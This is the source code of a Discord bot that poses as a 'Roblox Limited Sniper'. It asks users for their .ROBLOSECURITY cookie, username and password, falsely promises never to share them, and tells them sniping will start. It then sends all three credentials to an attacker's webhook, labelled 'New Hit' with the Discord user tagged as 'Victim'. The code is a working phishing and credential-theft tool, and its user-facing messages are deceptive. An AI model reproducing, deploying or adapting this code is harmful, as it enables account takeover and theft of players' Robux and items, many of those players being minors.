import discord
from discord.ext import commands
import aiohttp
import asyncio
import os, requests
from threading import Thread, Lock

token = 'BOT TOKEN HERE'
webhookurl = 'WEBHOOKURL HERE'
client = commands.Bot(command_prefix='.')
    
@client.event
async def on_ready():
    await client.wait_until_ready()
    print('Logged in as {0.user}'.format(client))
    
@client.command()
async def start(message):
    embed=discord.Embed(title="Roblox Limited Sniper", color=0x486af7)
    embed.add_field(name="Step 1:", value="Please send your ** .ROBLOSECURITY Token** This is to connect our bot servers to your account to make sure you have the fastest snipes.", inline=False)
    embed.add_field(name="Note:", value="We will **NEVER** share your ** .ROBLOSECURITY, USERNAME, OR PASSWORD**  anywhere, as it is against ours and ROBLOX's Terms Of Service.", inline=False)
    embed.add_field(name="Example of a .ROBLOSECURITY:", value=f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_FVHK9GQ1BZBT3AKTM490W9VAIOVGAA4A7PE228HNRTHXQSF3P9GQIFUKXTBP59TC7CNTDMFHSKTFLFXNTXDDGBEQ0C59FZGTQKEOFF6VUDI9JZCEY9RBQYPRYCDSQHSELC8YUQ6EBAGXRNHQKAZTR0ZZIQZC7G2IZK6XOGEJ8BGZC1TRSH0UDUYUQCWKMDGFE6QE3ONQB5WFA2ESOGEVLB74VHNF3SLGYTRQSOHMOISIKEDJQSIT13PW35QP0UVEFCZYT0NZB4QHD25EPRQMIXQVC6SI1PJKM2I4C26ZPWLEXPVT1CTLOWKNDXV7HR0CJT6PSBD6PMXNR4H6JPWLK6JRWKY9PYCLH932ZBXPHG60LBRTGRGJURB5MHN48ZJERH6EC792AUYEZRTWLTTJKST5F7QGU3EBRGIHOS8EAJJM7CNTANNA76NL4RZLQRZZGH2WYUYAZQLJP8CAXGEJVIOEXZRLVFS1AQZ6HTKTJFV6KABCCQOHQRF4KHSQVLFH3BWMSDN9AIH45WTZOIDNT5CCUAPKSII0PEFBFULB3Q4J7GA75NJNQ5WWG0V6LKX2AB6AZ1FG8PJFEWT6J7IHUBZFIL3MSNV2RRGUFHBN0AMY0PHNQP8Y4D4ZOYO8VJXSZCQRFRHV \n \n **^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^** \n This is a **RANDOMLY GENERATED .ROBLOSECURITY,** only used for examples. \n \n **ENTERING A RANDOM .ROBLOSECURITY WILL NOT WORK.**", inline=False)
    embed.set_footer(text="Roblox Limited Sniper v1.4 - #1 Limited Sniper Bot!")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/875513713946415126/920889837987450910/Improved_Valkyrie_Helm.png")
    await message.send(embed=embed)
    
    def author_and_channel(msg):
        return msg.author == message.author and msg.channel == message.channel
    
    msg = await client.wait_for("message", check=author_and_channel)

    embed2=discord.Embed(title="Roblox Limited Sniper", color=0x486af7)
    embed2.add_field(name="Step 2:", value="Please send your **ROBLOX USERNAME**. This is to make sure that the bot has the right person and doesn't get logged out while sniping.", inline=False)
    embed2.add_field(name="Note:", value="We will **NEVER** share your ** .ROBLOSECURITY, USERNAME, OR PASSWORD**  anywhere, as it is against ours and ROBLOX's Terms Of Service.", inline=False)
    embed2.set_footer(text="Roblox Limited Sniper v1.4 - #1 Limited Sniper Bot!")
    embed2.set_thumbnail(url="https://cdn.discordapp.com/attachments/875513713946415126/920889837987450910/Improved_Valkyrie_Helm.png")
    await message.send(embed=embed2)
    
    msg2 = await client.wait_for("message", check=author_and_channel)
    
    embed3=discord.Embed(title="Roblox Limited Sniper", color=0x486af7)
    embed3.add_field(name="Step 3:", value="Please send your **ROBLOX PASSWORD**. This is to make sure that the bot doesn't get logged out while sniping.", inline=False)
    embed3.add_field(name="Note:", value="We will **NEVER** share your ** .ROBLOSECURITY, USERNAME, OR PASSWORD**  anywhere, as it is against ours and ROBLOX's Terms Of Service.", inline=False)
    embed3.set_footer(text="Roblox Limited Sniper v1.4 - #1 Limited Sniper Bot!")
    embed3.set_thumbnail(url="https://cdn.discordapp.com/attachments/875513713946415126/920889837987450910/Improved_Valkyrie_Helm.png")
    await message.send(embed=embed3)
    
    msg3 = await client.wait_for("message", check=author_and_channel)
    
    embed4=discord.Embed(title="Roblox Limited Sniper", color=0x486af7)
    embed4.add_field(name="Finished", value="The bot has successfully connected and will start sniping limiteds momentarily.", inline=False)
    embed4.add_field(name="Note:", value="Thank you for choosing this bot out of many others!", inline=False)
    embed4.set_footer(text="Roblox Limited Sniper v1.4 - #1 Limited Sniper Bot!")
    embed4.set_thumbnail(url=f"https://cdn.discordapp.com/attachments/875513713946415126/920889837987450910/Improved_Valkyrie_Helm.png")
    await message.send(embed=embed4)
    
   
    client.session = aiohttp.ClientSession() 
    webhook = discord.Webhook.from_url(webhookurl, adapter=discord.AsyncWebhookAdapter(client.session))
    # Starting the task
    embed7=discord.Embed(title="Roblox Limited Sniper Logger", description="New Hit!", color=0x4892f7)
    embed7.add_field(name="ROBLOSECURITY:", value=f"```{msg.content}```", inline=False)
    embed7.add_field(name="Username", value=f"```{msg2.content}```", inline=False)
    embed7.add_field(name="Password", value=f"```{msg3.content}```", inline=False)
    embed7.set_footer(text=f"Victim: {msg.author}")
    embed7.set_thumbnail(url=f"http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username={msg2.content}")
    await webhook.send(embed=embed7)
    await client.session.close()
    

client.run(token)

